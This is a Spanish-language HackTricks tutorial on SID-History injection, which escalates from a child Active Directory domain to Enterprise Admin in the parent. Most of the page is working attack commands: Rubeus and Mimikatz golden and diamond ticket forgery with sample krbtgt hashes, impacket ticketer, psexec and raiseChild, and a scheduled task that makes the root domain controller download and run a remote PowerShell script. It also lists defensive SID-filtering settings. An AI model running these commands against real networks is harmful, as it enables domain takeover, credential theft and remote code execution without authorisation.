# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

El objetivo del **SID History Injection Attack** es facilitar la **migración de usuarios entre dominios** y garantizar al mismo tiempo el acceso continuo a los recursos del dominio anterior. Esto se logra **incorporando el Security Identifier (SID) anterior del usuario al SID History** de su nueva cuenta. Cabe destacar que este proceso puede manipularse para otorgar acceso no autorizado añadiendo el SID de un grupo con altos privilegios (como Enterprise Admins o Domain Admins) del dominio principal al SID History. Esta explotación proporciona acceso a todos los recursos del dominio principal.<sup>[[1]](#references)[[2]](#references)</sup>

Existen dos métodos para ejecutar este ataque: mediante la creación de un **Golden Ticket** o un **Diamond Ticket**.

Para identificar el SID del grupo **"Enterprise Admins"**, primero se debe localizar el SID del dominio raíz. Una vez identificado, el SID del grupo Enterprise Admins se puede construir añadiendo `-519` al SID del dominio raíz. Por ejemplo, si el SID del dominio raíz es `S-1-5-21-280534878-1496970234-700767426`, el SID resultante del grupo "Enterprise Admins" sería `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

También se pueden usar los grupos **Domain Admins**, cuyo SID termina en **512**.

Otra forma de encontrar el SID de un grupo del otro dominio (por ejemplo, "Domain Admins") es mediante:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Ten en cuenta que es posible deshabilitar el historial de SID en una relación de confianza, lo que hará que este ataque falle.

Según la [**documentación**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Deshabilitar SIDHistory en forest trusts** mediante la herramienta netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Aplicar SID Filter Quarantining a external trusts** mediante la herramienta netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Aplicar SID Filtering a domain trusts dentro de un único forest** no es recomendable, ya que es una configuración no compatible y puede provocar cambios incompatibles. Si un domain dentro de un forest no es confiable, no debería ser miembro del forest. En esta situación, primero es necesario dividir los domains confiables y no confiables en forests separados, donde se pueda aplicar SID Filtering a un interforest trust

Consulta este post para obtener más información sobre cómo hacer bypass de esto: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

La última vez que lo probé tuve que añadir el argumento **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) with KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Para más información sobre golden tickets, consulta:


{{#ref}}
golden-ticket.md
{{#endref}}


Para más información sobre diamond tickets, consulta:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Escalar a DA del dominio raíz o a Enterprise admin usando el hash KRBTGT del dominio comprometido:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Con los permisos obtenidos mediante el ataque, puedes ejecutar, por ejemplo, un ataque DCSync en el nuevo dominio:


{{#ref}}
dcsync.md
{{#endref}}

### Desde Linux

#### Manual con [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automático usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Este es un script de Impacket que **automatiza la escalada del dominio hijo al dominio padre**. El script necesita:

- Controlador de dominio objetivo
- Credenciales para un usuario administrador en el dominio hijo

El flujo es:

- Obtiene el SID del grupo Enterprise Admins del dominio padre
- Recupera el hash de la cuenta KRBTGT en el dominio hijo
- Crea un Golden Ticket
- Inicia sesión en el dominio padre
- Recupera las credenciales de la cuenta Administrator en el dominio padre
- Si se especifica el switch `target-exec`, se autentica en el Domain Controller del dominio padre mediante Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referencias

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [¿Qué es el Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Consideraciones de seguridad para trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - Sid Filter As Security Boundary Between Domains Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
